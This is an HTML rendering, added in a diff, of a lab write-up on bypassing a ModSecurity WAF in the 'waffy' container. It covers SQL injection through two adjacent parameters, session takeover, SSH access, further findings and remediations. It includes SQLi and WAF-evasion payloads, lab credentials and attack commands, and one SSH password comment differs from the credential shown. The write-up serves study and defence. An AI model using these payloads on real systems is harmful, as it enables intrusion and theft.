+<code>200 ¡Bienvenido, balutin!</code>.</li>
+<li><strong>Root cause, two layers, and they must be reported separately:</strong>
+<ol>
+<li><strong>Application (the vulnerability).</strong> String concatenation into SQL. A tautology in a
+single parameter is caught (10/10 blocked) — the flaw is that there are <em>two</em>
+adjacent injection points sharing one literal, and the fix is PDO bound parameters,
+which removes the class entirely.</li>
+<li><strong>WAF (the detection gap, and it is a gap in the <em>model</em>, not a bug in ModSecurity).</strong>
+Anomaly scoring is <strong>compositional-blind</strong>: it sums per-variable scores and has no
+notion of a value that is only dangerous in combination. <strong>This is not a ModSecurity
+vulnerability and must not be reported as one.</strong> It is the correct, expected behaviour
+of a per-variable scoring engine, and the honest framing is: <em>a WAF of this class
+cannot be the control for a sink that composes its inputs.</em> The only real control is
+the sink's own parameterisation.</li>
+</ol>
+</li>
+<li><strong>Remediation:</strong> <code>index.php:126</code> → prepared statement with bound parameters. Do <strong>not</strong>
+attempt to close this by adding CRS rules; there is no rule that can see a value that
+does not exist in any single variable.</li>
+</ul>
+<h3 id="f2--secruleengine-on-is-scoped-to-a-single--not-to-the-server-cwe-1188--misconfiguration">F2 — <code>SecRuleEngine On</code> is scoped to a single <code>&lt;VirtualHost&gt;</code>, not to the server (CWE-1188 / misconfiguration)</h3>
+<p><code>SecRuleEngine On</code> appears <strong>once</strong> in the whole Apache tree, at
+<code>/etc/apache2/sites-available/000-default.conf:9</code>, nested inside <code>&lt;VirtualHost *:80&gt;</code>
+inside <code>&lt;IfModule security2_module&gt;</code>. ModSecurity's default is <code>Off</code>. The module and all
+47 rule files load globally; <strong>the switch that makes them run is per-vhost.</strong></p>
+<ul>
+<li><strong>Measured:</strong> the directive's location and uniqueness (grep over <code>/etc/apache2/</code>).</li>
+<li><strong>Inferred, flagged as inference:</strong> a second vhost added to this image would run with
+the engine <strong>off</strong> and the full CRS loaded but inert. <strong>Not demonstrated</strong> —
+<code>sites-enabled/</code> contains only <code>000-default.conf</code>, so there was nothing to test against.
+Stated as a configuration risk, not a proven bypass.</li>
+<li><strong>Remediation:</strong> set <code>SecRuleEngine</code> at server scope (<code>apache2.conf</code> or a
+<code>conf-enabled</code> file), not in a vhost.</li>
+</ul>
+<h3 id="f3--secrequestbodyaccess-is-off-the-crs-cannot-see-request-bodies-cwe-693-protection-mechanism-failure">F3 — <code>SecRequestBodyAccess</code> is Off: the CRS cannot see request bodies (CWE-693, protection-mechanism failure)</h3>
+<p><code>mods-available/security2.conf:1-7</code> never includes <code>modsecurity.conf-recommended</code>, and
+<code>/etc/modsecurity/modsecurity.conf</code> <strong>does not exist</strong>. Body access therefore defaults to
+<strong>Off</strong>, and <code>SecAuditEngine</code>, <code>SecDebugLog</code> and the JSON rules <code>200001</code>/<code>200006</code> are
+likewise absent.</p>
+<ul>
+<li><strong>Evidence (the differential, with work counts):</strong> the byte-identical string
+<code>' or 1=1-- -</code> scores <strong>+5 via <code>942100</code> in a query string</strong> and <strong>0 in a POST body</strong>
+(B1 vs B2/B3). <code>942100</code> is simply absent from the POST log slices.</li>
+<li><strong>Impact — and the honest limit of it:</strong> every CRS rule whose target list includes
+<code>REQUEST_BODY</code> is inert, which is most of <code>REQUEST-932/933/934/941/942</code>. <strong>In this lab
+it is not exploitable</strong>, because the only sink reads <code>$_GET</code> (<code>index.php:122-123</code>) and a
+POST body never reaches it — B2's <code>200</code> was the untouched login form (sha
+<code>26a69b2846a52372</code>, identical to a bare <code>GET /index.php</code>), which is why it is recorded
+as a 200 that proves nothing. <strong>Reported as a live misconfiguration whose exploitability
+is currently masked by the application's own parameter choice.</strong> A one-line change to
+<code>$_REQUEST</code> in the application would turn it into a complete WAF bypass.</li>
+<li><strong>Remediation:</strong> install and include <code>modsecurity.conf-recommended</code>, and set
+<code>SecRequestBodyAccess On</code>, <code>SecAuditEngine RelevantOnly</code> with a real <code>SecAuditLog</code>.</li>
+</ul>
+<h3 id="f4--db-credentials-in-the-docroot-cwe-312">F4 — DB credentials in the docroot (CWE-312)</h3>
+<p><code>/var/www/html/config.php:1-13</code> returns the MariaDB DSN, user <code>phpuser</code>, password <code>paso</code>,
+database <code>register</code>, and is world-readable (<code>-rw-r--r-- www-data www-data</code>). It sits in
+the served document root, so it is retrievable as <code>GET /config.php</code> — although, measured,
+the PHP extension executes it and returns an <strong>empty body</strong> rather than its source, so it
+is exposed to local readers and to any future <code>.php</code>-source-disclosure bug, not directly
+over HTTP today. The credential is also trivially weak and is a <code>phpuser</code> DB account, not
+a web credential. The SSH credential handed out by the admin panel (<code>admin.php:90-91</code>) is
+the same string as the <strong>database</strong> row's password (<code>balutin</code> / <code>balulerobalulon</code>) —
+<strong>credential reuse across two tiers.</strong></p>
+<h3 id="f5--login-outcome-is-signalled-only-by-the-location-header-application-design-defect-and-a-reporting-hazard">F5 — Login outcome is signalled only by the <code>Location</code> header (application design defect, and a reporting hazard)</h3>
+<p><code>index.php:140</code> issues <code>header($forward); exit;</code> with either <code>/index.php</code> or
+<code>/admin.php</code>. <strong>Both outcomes are <code>302</code> with a byte-identical 3109-byte body</strong>
+(sha <code>6fb6adb3330e847e</code>). Success and failure are distinguishable <strong>only</strong> by the
+<code>Location</code> header or by following the redirect.</p>
+<p>This is filed as a finding because it is a live measurement hazard, demonstrated with
+numbers in Instrumentation defect 3: a status-code-only or body-hash-only check scores a
+<strong>failed login as a success</strong>. Any automated check against this app must assert on
+<code>Location</code> or on the admin page's content, never on status.</p>
+<h3 id="f6--reflected-dom-xss-in-pruebahtml-cwe-79--found-not-used">F6 — Reflected DOM XSS in <code>prueba.html</code> (CWE-79) — found, not used</h3>
+<p><code>/var/www/html/prueba.html</code> reflects the <code>q</code> parameter into the page with <strong>no
+sanitisation</strong>, client-side: <code>URLSearchParams.get('q')</code> → <code>document.write(query)</code>.</p>
+<ul>
+<li><strong>The sink is client-side, not server-side.</strong> The reflection happens in the victim's
+browser via JavaScript, so it is a DOM-based XSS and <strong>ModSecurity is structurally
+incapable of defending it</strong> — the malicious value never appears in a server-rendered
+response, and CRS response-body rules (which would need <code>SecResponseBodyAccess</code>, also
+unset) do not apply to a <code>document.write</code> that the server never sees.</li>
+<li>Reported as an independent finding. It is <strong>not</strong> part of the WAF-bypass chain and was
+not used to obtain the reward — the chain in §Chain is SQLi → session → SSH, and nothing
+in it depends on XSS. Kept separate deliberately: merging them would imply the XSS
+contributed to the compromise, and it did not.</li>
+</ul>
+<hr />
+<h2 id="controls-that-held">Controls that held</h2>
+<table>
+<thead>
+<tr>
+<th>Control</th>
+<th>Positive control that proves this detector works</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>OWASP CRS PL1 SQLi detection (<code>942100</code>, libinjection)</strong></td>
+<td><strong>Fired on 10/10</strong> quote-bearing variants, plus the author's own probes preserved in the shipped <code>error.log</code> (Aug 23 2025: <code>detected SQLi using libinjection with fingerprint 's&amp;1c'</code>, <code>ARGS:name: ' or 1=1-- -</code>). It also fired on my <code>zzzprobe</code> control (N6) <em>on the same request line as the bypass</em>, which is what proves it was live and looking. <strong>A control that fired on every attempt I made against it, including after I found the bypass.</strong></td>
+</tr>
+<tr>
+<td><strong>Generic SQLi regex (<code>942190</code>)</strong></td>
+<td>Fired alongside <code>942100</code> on all 6 <code>UNION SELECT</code> variants (V1, V3–V7, W3–W5), each +5. Independent detector, independently proven.</td>
+</tr>
+<tr>
+<td><strong>Anomaly threshold enforcement (<code>949110</code>)</strong></td>
+<td><code>Access denied with code 403 (phase 2)</code> observed on 13 distinct blocked requests, with <code>Operator GE matched 5 at TX:blocking_inbound_anomaly_score</code> in the log. Fires at exactly 5 (N1) and at 13 and 18.</td>
+</tr>
+<tr>
+<td><strong>Block happens before the application</strong></td>
+<td>Blocked request → <strong>0</strong> <code>[response-cookie-header]</code>; allowed request → <code>PHPSESSID</code> present. Since <code>index.php:102</code> always calls <code>session_start()</code>, a pass always sets a cookie.</td>
+</tr>
+<tr>
+<td><strong><code>admin.php</code> session guard (<code>admin.php:5-8</code>)</strong></td>
+<td><strong>Three independent refusals, all → <code>Location: /index.php</code>:</strong> no cookie at all; the <strong>X2 mismatched-token session</strong>; and post-restore. The guard is real and it is the only thing standing between an unauthenticated request and the SSH credentials at <code>admin.php:90-91</code>. It held every time.</td>
+</tr>
+<tr>
+<td><strong><code>PDO::ERRMODE_EXCEPTION</code> (<code>config.php:9</code>)</strong></td>
+<td>Fires as designed — a malformed query surfaces the PDO message through <code>index.php:135-138</code> rather than a silent empty result. This is a <em>robustness</em> control that happened to be an information-disclosure aid; noted both ways.</td>
+</tr>
+<tr>
+<td><strong>No second vhost, no <code>ProxyPass</code>, no root shell</strong></td>
+<td><code>sites-enabled/</code> = 1 file; <code>ProxyPass</code> = 0 occurrences; SSH lands at <code>uid=1000(baluton)</code>, and <code>ls -la /root</code> → <code>Permission denied</code>. The engagement stayed inside one host and one unprivileged identity after the web hop.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="not-tested-vs-discarded-with-reason">NOT tested vs discarded with reason</h2>
+<p><strong>NOT tested — no conclusion is claimed either way:</strong></p>
+<ul>
+<li><strong>Any privilege escalation from <code>baluton</code> (uid 1000) to root.</strong> Not attempted. <code>/root</code>
+is unreadable; <code>/opt</code> and <code>/srv</code> are empty; <strong>no <code>sudo -l</code>, no SUID sweep, no
+capability check was run.</strong> The author's own <code>.bash_history</code> (readable, 64 bytes) shows
+they <em>tried</em> <code>sudo -l</code> and <code>find / -perm -4000</code> — so an escalation surface was
+plausibly in scope for the lab author, and it is <strong>explicitly untested, not cleared.</strong>
+Per corpus defect 1, any future <code>find -writable</code> sweep here must use a working
+substitute.</li>
+<li><strong>The F2 inference</strong> (a second vhost would run with the engine off) is unproven — there
+was no second vhost to test against.</li>
+<li><strong><code>REQUEST-942</code> and the other PL2–4 rule files</strong> were confirmed present and confirmed
+inert (<code>per_pl=1-0-0-0</code>). Whether PL2 would have caught the F1 bypass was <strong>not
+tested</strong> — raising the paranoia level would have modified the lab, and the finding is
+reported at the level the lab ships.</li>
+<li><strong>UDP beyond the two <code>/proc/net/udp{,6}</code> files</strong> (both 0 data rows) and
+<code>ExposedPorts = null</code>.</li>
+<li><strong>Whether the <code>t:removeNulls</code> transformation in 942100 is individually exploitable</strong>
+(a <code>%00</code> truncation attack). Observed in the pipeline, not tested.</li>
+<li><strong>Any second SQL sink.</strong> <code>grep</code> over <code>/var/www/html</code> found one query, at
+<code>index.php:126</code>. The DB holds one table, one row.</li>
+</ul>
+<p><strong>Discarded with reason:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Discarded</th>
+<th>Reason</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Double-URL-encoding the payload</strong> (<code>%2527…</code>) — the textbook bypass</td>
+<td><strong>403</strong>, <code>942100</code> fired, score 5. Reason, measured (N1/N2/N3): ModSecurity applies <code>t:urlDecodeUni</code> to a value it has <em>already</em> decoded, so it decodes <strong>twice</strong> while PHP decodes once. The WAF is <em>stricter</em> than the app, so double-encoding makes detection <strong>more</strong> likely, not less. This is the opposite of the usual parser differential and is why the classic trick fails.</td>
+</tr>
+<tr>
+<td><code>/*!UNION*/ /*!SELECT*/</code> MySQL versioned comments</td>
+<td>403, score 18 — <code>942100</code> + <code>942190</code> + <code>942500</code>. MySQL executes versioned comments; libinjection sees through them.</td>
+</tr>
+<tr>
+<td><code>/**/</code> comment separation, mixed case, tab/newline separators, <code>#</code> comments</td>
+<td>403, scores 13–18. Four independent lexical evasions; none moved the score below the threshold.</td>
+</tr>
+<tr>
+<td><code>UNION SELECT …</code> with a quoted marker <strong>or</strong> a hex marker, <code>#</code> <strong>or</strong> <code>--</code></td>
+<td>All 403 at 13. The trigger is <code>UNION SELECT</code> itself, not the quoting or the comment style.</td>
+</tr>
+<tr>
+<td><strong>Bypassing via POST</strong> (the <code>SecRequestBodyAccess Off</code> gap, F3)</td>
+<td>200 — <strong>but a 200 that proves nothing</strong>: byte-identical to the bare login form, because the sink reads <code>$_GET</code>. Kept as a separate finding (F3) with its exploitability explicitly limited, rather than reported as a bypass.</td>
+</tr>
+<tr>
+<td><code>name=\' </code> as the &quot;one character apart&quot; liveness control (N5)</td>
+<td><strong>My control failed</strong> — adding a <code>'</code> to <code>name</code> produced 0 log lines, because <code>\'</code> alone is not a detectable SQLi pattern. A control that never fires is not a control. <strong>Discarded and replaced</strong> with the <code>zzzprobe</code> third-parameter design (N6/N7), which fired. This is instrumentation defect 4.</td>
+</tr>
+<tr>
+<td>The XSS in <code>prueba.html</code> as part of the chain</td>
+<td>Client-side sink; contributes nothing to a server-side SQLi→SSH chain. Reported separately as F6, deliberately not merged into the chain.</td>
+</tr>
+<tr>
+<td><code>find / -iname '*flag*'</code> as the reward search</td>
+<td>Found only <code>/var/lib/mysql/debian-10.11.flag</code> — a MariaDB packaging artefact, not a reward. Superseded by the full <code>FLAG{</code> sweep below.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="instrumentation-defects">Instrumentation defects</h2>
+<p><strong>1. <code>docker exec &lt;c&gt; &lt; file</code> evaluates the redirect on the HOST, not in the container.</strong>
+My log-slice harness used <code>before=$(docker exec waffy_container wc -l &lt; /var/log/…/error.log)</code>
+to record a line offset. The <code>&lt;</code> is parsed by the <em>host</em> shell, which produced
+<code>No such file or directory</code> on <strong>stderr</strong>, while the command still returned an empty
+string. Every probe then reported <code>loglines=0</code>.</p>
+<p><strong>Cost: the first four probes of the <code>SecRequestBodyAccess</code> test silently reported &quot;no
+rules fired&quot; for a payload I already knew fires.</strong> That is defect 10 in its purest form —
+a zero count that meant <em>the instrument never ran</em>, not <em>the engine never spoke</em>. Had I
+believed it, the single most important finding in the lab (F3) would have been inverted
+into &quot;the CRS does not detect SQLi at all&quot;. Fixed with
+<code>docker exec &lt;c&gt; sh -c 'wc -l &lt; file'</code>, after which the offsets were real and B1 showed
+<code>942100</code> firing exactly as expected. <strong>The catch: the same run also produced a 403 on B1,
+and a 403 alone does not tell you which half of the pipeline lied.</strong> Only re-running with
+a fixed instrument did.</p>
+<p><strong>2. The first four baseline probes returned <code>000</code> / 0 bytes, and I refused to file that as
+a result.</strong> A batch of four <code>probe.sh</code> calls — the very first HTTP requests of the
+engagement — all came back <code>000</code>, zero bytes, empty hash. The obvious reading is
+&quot;connection refused, service down, no surface&quot;. The actual cause was the harness, not the
+target: invoking it through a variable-expanded path in the same shell invocation that
+created it failed, while <code>./probe.sh</code> worked immediately. nmap had already shown 80/tcp
+open and a subsequent <code>curl -sv</code> returned <code>200</code> in 0.02 s. <strong>Re-run, not reinterpreted.</strong></p>
+<p><strong>3. <code>rtk curl</code> produced no output and exit 0.</strong> <code>rtk curl -sv http://[net-0-9]/ -o /dev/null</code>
+printed <strong>nothing at all</strong> and exited 0 — a silent, successful-looking invocation. Plain
+<code>curl -sv</code> immediately returned the full <code>200</code> with headers. The wrapper is on the PATH and
+is the natural thing to type; every surprising result in this engagement was therefore
+re-run through plain <code>curl</code> before being believed. <em>(Corpus defect 5, confirmed again:
+a wrapper that drops output is indistinguishable from a request that returned nothing.)</em></p>
+<p><strong>4. My own liveness control was badly designed and I caught it — this is the one worth
+keeping.</strong> To prove the engine was alive during the bypass, I sent the bypass with <strong>one
+extra character</strong> (<code>name</code> = <code>\'</code> instead of <code>\</code>). Both requests produced <strong>0 log lines</strong>.
+Taken at face value that would have been read as &quot;the engine is dead, so the bypass proves
+nothing&quot; — or, worse, as &quot;the bypass worked because ModSecurity was off&quot;, which would have
+been a completely wrong finding about a WAF that is demonstrably enforcing.</p>
+<p>The reason the control failed is that <code>\'</code> on its own is not a detectable SQLi pattern:
+libinjection correctly treats an escaped quote as data. <strong>A control must be built from a
+condition you have already seen succeed</strong>, not from a payload that merely looks more
+alarming. Replaced with the <code>zzzprobe</code> design: same request, plus a third parameter
+carrying <code>' or 1=1-- -</code>, a payload <em>proven</em> to fire 10 times in this very engagement. It
+fired, and the log named <code>ARGS:zzzprobe</code> <strong>only</strong> — which simultaneously proved the engine
+was live <em>and</em> that <code>name</code>/<code>password</code> scored zero. <strong>The replacement was better than the
+thing it replaced</strong>, because it produced a per-variable attribution the original could not.</p>
+<p><strong>5. The redirect-following trap, measured on the actual finding.</strong> The same two requests
+that differ only in one hex digit:</p>
+<table>
+<thead>
+<tr>
+<th>Invocation</th>
+<th>Positive (correct)</th>
+<th>Negative (must fail)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>curl -L</code> (<strong>follows redirects</strong>)</td>
+<td><code>200</code>, 2421 B, <code>…/admin.php</code></td>
+<td><code>200</code>, 3793 B, <code>…/index.php</code></td>
+</tr>
+<tr>
+<td><code>curl -D -</code> (<strong>no follow</strong>)</td>
+<td><code>302</code> → <code>/admin.php</code></td>
+<td><code>302</code> → <code>/index.php</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>With redirects followed, the failed authentication returns <code>200</code></strong> — the login page. A
+status-code check scores a failed login as a complete success, and the two differ only by
+a byte count nobody reads. Without following, both are <code>302</code> and the <code>Location</code> header
+separates them cleanly. I used <code>-D -</code> and never <code>-L</code> for every auth test. <em>(Corpus
+defect 3, again — and note it bit harder here than in 218, because in 218 the decoy was a
+login page behind a vhost 303, while here the success and failure paths are the same
+endpoint's own redirect.)</em></p>
+<p><strong>6. <code>403</code> was not a verdict, and the body hash that 218 prescribes is not sound against a
+real engine.</strong> Same blocking event, two different body hashes, because ModSecurity serves
+Apache's stock error document and that document embeds the <code>Host</code> it refused:</p>
+<table>
+<thead>
+<tr>
+<th><code>Host</code> sent</th>
+<th>Bytes</th>
+<th>sha256 (16)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>[net-0-9]</code></td>
+<td>275</td>
+<td><code>1630ab41ca37e421</code></td>
+</tr>
+<tr>
+<td><code>waffy.dl</code></td>
+<td><strong>273</strong></td>
+<td><strong><code>f5fefd67ac851ba2</code></strong></td>
+</tr>
+</tbody>
+</table>
+<p>A body-hash allowlist built from one probe would have <strong>mislabelled the other</strong>. There is
+no vendor fingerprint at all in the response — no rule ID, no score, no
+<code>Server: ModSecurity</code>. <strong>What made the block attributable here was enumerating the
+application's own status set and observing that it never emits a 403</strong> — a fact from the
+application, not from the WAF. And the single most useful instrument in this entire
+engagement was neither the status nor the body: it was the CRS anomaly-score line in
+<code>error.log</code>, which names the rule ID, the matched variable, the score and the threshold on
+every request.</p>
+<p><strong>7. <code>SecRequestBodyAccess</code> had to be measured, not read.</strong> &quot;No <code>modsecurity.conf</code> is
+included, therefore body access is Off&quot; is an inference from a default. The B1/B2/B3
+differential turned it into a measurement, and the B2 result (<code>200</code>, login page) is
+recorded explicitly as a <strong>200 that proves nothing</strong> rather than as a successful bypass.</p>
+<hr />
+<h2 id="reward">Reward</h2>
+<p><strong>No <code>FLAG{}</code> exists in this lab.</strong> Absence established by search, with the work count:</p>
+<pre><code>$ grep -rl &quot;FLAG{&quot; / --exclude-dir=proc --exclude-dir=sys --exclude-dir=dev
+files scanned: 17440   files containing FLAG{: 0
+</code></pre>
+<p>Corroborating: <code>grep -rniE 'flag|ctf|congratulations|reward' /var/www/</code> → <strong>0 hits</strong>;
+<code>grep -rniE 'flag\{|CTF' /home /opt /srv /var/www</code> as <code>baluton</code> → <strong>0 hits</strong>; <code>/opt</code> and
+<code>/srv</code> are empty; <code>[lab-home]/baluton/</code> holds only dotfiles; the only filesystem match for
+<code>*flag*</code> is <code>/var/lib/mysql/debian-10.11.flag</code>, a MariaDB packaging artefact.</p>
+<p><strong>The reward this lab actually pays is the administrative access itself</strong>, and it is
+functional:</p>
+<pre><code>$ curl -s -b fj.txt http://waffy.dl/admin.php | grep -oE 'Bienvenido, [^&lt;]*|Usuario: [a-z]*|Contraseña: [a-z]*'
+Bienvenido, balutin! 🎉
+Usuario: baluton
+Contraseña: balulerobalulon
+
+$ ssh baluton@[net-0-9]   # password: baluterobalulon
+uid=1000(baluton) gid=1000(baluton) groups=1000(baluton)
+</code></pre>
+<p><code>admin.php:88</code> states the success criterion in the lab's own words: <em>&quot;¡Felicidades! Has
+logrado hacer un bypass del WAF con éxito.&quot;</em> The credential is a <strong>reused</strong> one: identical
+to the <code>balutin</code> database row's password (F4).</p>
+<hr />
+<h2 id="restore">Restore</h2>
+<pre><code>$ docker rm -f waffy_container
+$ docker run -d --name waffy_container waffy:latest
+</code></pre>
+<p>Recreated <strong>from the image</strong>, not by undoing edits — I made no configuration changes and
+wrote no files in the container.</p>
+<table>
+<thead>
+<tr>
+<th>Check</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Container recreated from the image</td>
+<td>id <code>a54b389db01c…</code> → <strong><code>03e8c8b8eb00…</code></strong>, <code>Up</code>, IP <code>[net-0-9]</code></td>
+</tr>
+<tr>
+<td><strong>Filter restored — positively, not by absence</strong></td>
+<td><code>' or 1=1-- -</code> → <strong><code>403</code></strong>, <code>942100</code> + <code>949110</code> fired, <code>COMBINED_SCORE=5</code>, sha <code>f5fefd67ac851ba2</code>. <em>A 403 that comes back is the positive check; the absence of a 200 would not have been.</em></td>
+</tr>
+<tr>
+<td>Bypass reproducible from the clean image</td>
+<td>Re-attempted post-restore → <code>302 → /admin.php</code>, <code>newlog=0</code>. <strong>This is the correct result</strong>: the finding is a property of the shipped application and shipped CRS, so a freshly-recreated container reproduces it. It is not residue of my session.</td>
+</tr>
+<tr>
+<td>Service healthy</td>
+<td><code>GET /admin.php</code> unauthenticated → <code>302 → /index.php</code> (guard intact)</td>
+</tr>
+<tr>
+<td>Docroot clean</td>
+<td><code>admin.php config.php index.php prueba.html</code> — the 4 shipped files</td>
+</tr>
+<tr>
+<td>Artefacts of mine</td>
+<td><code>find / -xdev -iname '*DL84*'</code> → <strong>0</strong>. I wrote no file into the container at any point; the token existed only inside HTTP requests.</td>
+</tr>
+<tr>
+<td>Pre-existing files left alone</td>
+<td><code>/tmp/tmp.ArVcJ0LXGe*</code>, <code>/tmp/ubuntu-release-upgrader-*</code> etc. were present before my work and are <strong>not mine to delete</strong> — left in place per RUNBOOK §9.</td>
+</tr>
+<tr>
+<td>Other principals untouched</td>
+<td>No <code>docker system/image/volume prune</code> was run at any point. The seven <code>cybervault-*</code> containers and their volumes are untouched.</td>
+</tr>
+</tbody>
+</table>
+<p>Local scratch is confined to <code>/tmp/[tool]/dl84/</code> (probe harness, cookie jars, the SSH
+helper). The 1.8 GB extracted tar <code>[lab-home]/dockerlabs/labs/84/waffy.tar</code> was removed
+after the writeup landed (PIPELINE reclaim policy: &quot;ours, safe — the same&quot;), with
+<code>dist/waffy.zip</code> retained so a retry needs no re-download. The <code>waffy:latest</code> image and the
+running container were <strong>kept</strong>, since the documented positive restore check is
+recreation from the image and the parent may need to re-verify.</p>
+<hr />
+<h2 id="what-the-parent-should-change-in-the-class-table">What the parent should change in the class table</h2>
+<p>The <code>RUNBOOK.md</code> §5 row for <strong>WAF / blocklist</strong> should be <strong>corrected, not extended</strong>. The
+parent owns that file; this is the evidence for the change, not an edit.</p>
+<p>Current row (RUNBOOK.md:143):</p>
+<blockquote>
+<p><strong>WAF / blocklist</strong> | Does the filter read the request, or the string after decoding? |
+The discriminator is the <strong>body</strong>, not the status. A blocklist names what you already
+know; a filter that validates a <em>string</em> hands the shell a <em>pattern</em></p>
+</blockquote>
+<p><strong>Three corrections, each with its evidence above:</strong></p>
+<ol>
+<li>
+<p><strong>The bypass is not lexical, so &quot;the unlisted encoding&quot; does not survive.</strong> Against
+libinjection at PL1, 10 quote-bearing variants in a single variable were blocked
+(V1–V7, W3–W5, N1–N3). <em>Unlisted encoding</em> is the right rule for a <strong>string blocklist</strong>
+and the wrong rule for a <strong>scoring engine</strong>, which matches a named variable list after
+a declared pipeline.</p>
+</li>
+<li>
+<p><strong>The generalisable replacement: validate the unit the executor actually receives.</strong>
+For a string blocklist that unit is a <em>string</em> (218: globs, brace expansion, <code>$IFS</code>).
+For a real WAF it is a <strong>composite</strong> — the engine scored <code>\</code> and <code>OR 0x…=0x…</code> as two
+unrelated zero-point strings while MySQL read them as one statement. Same underlying
+principle as 218's rule (a gap between what is validated and what is executed), a
+different mechanism. Add: <strong>read the engine's declared variable list and its
+<code>t:</code> transformation pipeline from the rule itself — that list is the attack surface,
+and a value that is only dangerous in combination is invisible to per-variable
+scoring.</strong></p>
+</li>
+<li>
+<p><strong>Body-hash discrimination needs a caveat, and there is a better instrument.</strong> A real
+engine's block page is unbranded and <strong>not byte-stable</strong> (275 B vs 273 B for the same
+event, varying with <code>Host</code>). Worse, here success and failure were both <code>302</code> with a
+byte-identical body, discriminated only by <code>Location</code>. The strongest instrument
+available was neither status nor body: it was the <strong>CRS anomaly-score log line</strong>, which
+names the rule ID, the matched variable, the score and the threshold per request.
+Suggest: <strong>assert on the engine's own audit line, and treat a WAF block as attributable
+only after enumerating what statuses the application itself can emit.</strong></p>
+</li>
+</ol>
+<p>Two additions worth carrying forward, both cheap and both from reading the artefact rather
+than attacking:</p>
+<ul>
+<li><strong><code>SecRuleEngine</code> scope is a control.</strong> Set at server scope or it is per-vhost, and
+ModSecurity's default is <code>Off</code> (F2). <em>Measured: it is vhost-scoped here; the
+consequence for a second vhost is inference, unproven.</em></li>
+<li><strong>Missing <code>modsecurity.conf</code> is a silent total gap, not a default.</strong> No include means no
+<code>SecRequestBodyAccess</code>, no audit log, no debug log (F3). Prove the setting with a
+differential — the same payload scored in a query string versus in a body — because
+&quot;the directive is absent&quot; and &quot;the engine does not read bodies&quot; are an inference and a
+measurement respectively, and only one of them is evidence.</li>
+</ul>
+
+</main>
+<footer><p><strong>The markdown in the repository is the authority.</strong> This site is a rendering of it. Where the two disagree, the repository is correct and this page is wrong &mdash; report it as a build defect, not as a finding.</p><p>Target-internal paths, container addresses and cookie identifiers are redacted in this rendering. The repository markdown is unredacted.</p><p>Counts on this site are read out of the source files at build time, and the renderer is <code>markdown-it-py</code>. Nothing on this page was written by hand except this footer, the homepage and the stylesheet.</p></footer>
+</body>
+</html>
